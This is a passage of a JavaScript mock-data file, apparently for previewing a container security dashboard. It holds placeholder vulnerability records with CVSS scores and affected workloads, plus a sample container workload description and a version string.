      name: 'CVE-2026-10019',
      severity: 'Medium',
      description: 'Cookie validation weakness in gateway helper.',
      feed_rating: 'Medium',
      packages: {},
      link: 'https://security.example.local/CVE-2026-10019',
      score: 5.4,
      score_v3: 6.1,
      vectors: 'AV:N/AC:M/Au:N/C:P/I:P/A:N',
      vectors_v3: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N',
      published_timestamp: 1774900000,
      last_modified_timestamp: 1775150000,
      package_name: 'gateway-helper',
      workloads: [
        {
          id: 'workload-checkout',
          display_name: 'checkout-74fc8c77f6-vjr4w',
          image: 'harbor.local/security/checkout:v2.4.1',
          policy_mode: 'protect',
        },
      ],
      nodes: [{ id: 'host-02', display_name: 'aks-nodepool-02' }],
      images: [{ id: 'sha256:checkout', display_name: 'checkout:v2.4.1' }],
      platforms: [],
      filteredWorkloads: [],
      filteredImages: [],
    },
    {
      name: 'CVE-2026-10044',
      severity: 'High',
      description: 'Deserialization flaw in message adapter.',
      feed_rating: 'High',
      packages: {},
      link: 'https://security.example.local/CVE-2026-10044',
      score: 7.4,
      score_v3: 8.0,
      vectors: 'AV:N/AC:L/Au:N/C:P/I:P/A:P',
      vectors_v3: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
      published_timestamp: 1774800000,
      last_modified_timestamp: 1775100000,
      package_name: 'message-adapter',
      workloads: [
        {
          id: 'workload-inventory',
          display_name: 'inventory-5f7dd79c77-9l6xq',
          image: 'harbor.local/security/inventory:v1.8.3',
          policy_mode: 'discover',
        },
      ],
      nodes: [{ id: 'host-01', display_name: 'aks-nodepool-01' }],
      images: [{ id: 'sha256:inventory', display_name: 'inventory:v1.8.3' }],
      platforms: [],
      filteredWorkloads: [],
      filteredImages: [],
    },
    {
      name: 'CVE-2026-10061',
      severity: 'Low',
      description: 'Minor metadata exposure in build tooling.',
      feed_rating: 'Low',
      packages: {},
      link: 'https://security.example.local/CVE-2026-10061',
      score: 3.1,
      score_v3: 3.8,
      vectors: 'AV:L/AC:H/Au:N/C:P/I:N/A:N',
      vectors_v3: 'CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N',
      published_timestamp: 1774700000,
      last_modified_timestamp: 1775080000,
      package_name: 'builder-meta',
      workloads: [
        {
          id: 'workload-frontend',
          display_name: 'frontend-6c7f7f6d9b-4xq8p',
          image: 'harbor.local/security/frontend:v2.1.0',
          policy_mode: 'monitor',
        },
      ],
      nodes: [{ id: 'host-01', display_name: 'aks-nodepool-01' }],
      images: [{ id: 'sha256:frontend', display_name: 'frontend:v2.1.0' }],
      platforms: [],
      filteredWorkloads: [],
      filteredImages: [],
    },
  ],
};

export const PREVIEW_CONTAINER_BRIEF_RESPONSE = {
  workload: {
    id: 'workload-frontend',
    name: 'frontend',
    display_name: 'frontend-6c7f7f6d9b-4xq8p',
    domain: 'production',
    host_name: 'aks-nodepool-01',
    image: 'harbor.local/security/frontend:v2.1.0',
    state: 'running',
    labels: {
      app: 'frontend',
      tier: 'edge',
    },
    ports: [
      {
        host_ip: '0.0.0.0',
        host_port: 30443,
        ip_proto: 6,
        port: 443,
      },
    ],
    app_ports: {
      HTTPS: '443',
      HTTP: '8080',
    },
    interfaces: {
      eth0: [{ ip: '10.42.1.10', ip_prefix: 24, gateway: '10.42.1.1' }],
    },
    children: [],
  },
};

export const PREVIEW_VERSION = '"5.4.0-preview"';
